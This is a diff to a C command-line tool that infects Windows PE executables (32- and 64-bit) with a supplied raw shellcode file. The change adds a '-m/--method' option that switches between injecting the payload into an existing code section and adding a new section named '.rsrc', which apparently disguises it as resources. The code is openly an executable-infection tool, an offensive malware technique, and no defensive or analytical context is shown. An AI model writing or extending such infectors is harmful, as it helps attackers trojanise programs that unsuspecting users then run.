@@ -9,6 +9,7 @@
 
 
 #define MAX_FILE_PATH 512
+#define MAX_STRING    256
 
 
 static char file_path[MAX_FILE_PATH] = "";
@@ -19,11 +20,14 @@ static int show_sections_flag = 0;
 static void ParseOptions(int argc, char** argv);
 static void PrintHelp(char* prog_name);
 
+static inf_method method = METHOD_CODE_INJECT;
+
 
 int main(int argc, char** argv) {
 	pe_dos_header dosHeader;
 	FILE* f = NULL;
 	ach_mode mode = MODE_32BIT;
+	//inf_method method = METHOD_CODE_INJECT;
 	
 	ParseOptions(argc, argv);
 	
@@ -185,10 +189,26 @@ int main(int argc, char** argv) {
 	int err = 0;
 	switch (mode) {
 		case MODE_32BIT:
-			err = pe_infect_section(f, out_f, &dosHeader, &ntHeader, xcode, size);
+			//err = pe_infect_section(f, out_f, &dosHeader, &ntHeader, xcode, size);
+			//err = pe_infect_new_section(f, out_f, &dosHeader, &ntHeader, xcode, size, ".code");
+			switch (method) {
+				case METHOD_CODE_INJECT:
+					err = pe_infect_section(f, out_f, &dosHeader, &ntHeader, xcode, size);
+					break;
+				case METHOD_CODE_NEWSECT:
+					err = pe_infect_new_section(f, out_f, &dosHeader, &ntHeader, xcode, size, ".rsrc");
+					break;
+			}
 			break;
 		case MODE_64BIT:
-			err = pe64_infect_section(f, out_f, &dosHeader, &ntHeader64, xcode, size);
+			switch (method) {
+				case METHOD_CODE_INJECT:
+					err = pe64_infect_section(f, out_f, &dosHeader, &ntHeader64, xcode, size);
+					break;
+				case METHOD_CODE_NEWSECT:
+					err = pe64_infect_new_section(f, out_f, &dosHeader, &ntHeader64, xcode, size, ".rsrc");
+					break;
+			}
 			break;
 	}
 	
@@ -205,7 +225,7 @@ int main(int argc, char** argv) {
 }
 
 static void ParseOptions(int argc, char** argv) {
-	const char* short_options = "hi:o:s:d";
+	const char* short_options = "hi:o:s:dm:";
 	
 	const struct option long_options[] = {
 		{ "help", no_argument, NULL, 'h' },
@@ -213,11 +233,13 @@ static void ParseOptions(int argc, char** argv) {
 		{ "output", required_argument, NULL, 'o' },
 		{ "shellcode", required_argument, NULL, 's' },
 		{ "info", no_argument, NULL, 'd' },
+		{ "method",  required_argument, NULL, 'm' },
 		{ NULL, 0, NULL, 0 }
 	};
 	
 	int res;
 	int option_index;
+	char tmp[MAX_STRING] = "";
 	
 	while (( res = getopt_long(argc, argv, short_options, 
 		long_options, &option_index)) != -1) {
@@ -238,6 +260,15 @@ static void ParseOptions(int argc, char** argv) {
 			case 'd':
 				show_sections_flag = 1;
 				break;
+			case 'm':
+				if (!strncmp(optarg, "code", MAX_STRING)) {
+					method = METHOD_CODE_INJECT;
+				} else if (!strncmp(optarg, "sect", MAX_STRING)) {
+					method = METHOD_CODE_NEWSECT;
+				} else {
+					fprintf(stdout, "Unknown method \"%s\". Using default method (code)\n", optarg);
+				}
+				break;
 			default:
 				PrintHelp(argv[0]);
 				break;
@@ -248,7 +279,9 @@ static void ParseOptions(int argc, char** argv) {
 static void PrintHelp(char* prog_name) {
 	fprintf(stdout, "Usage: %s -i <input_file> -o <output_file> -s <raw_shellcode_file>\n", prog_name);
 	fprintf(stdout, "\t -d - show section info\n");
+	fprintf(stdout, "\t -m - set infection method (available values: code, sect)\n");
 	fprintf(stdout, "Long options usage: %s --input <input_file> --output <output_file> --shellcode <raw_shellcode_file>\n", prog_name);
 	fprintf(stdout, "\t --info - show section info\n");
+	fprintf(stdout, "\t --method - set infection method (available values: code, sect)\n");
 	exit(-99);
 }
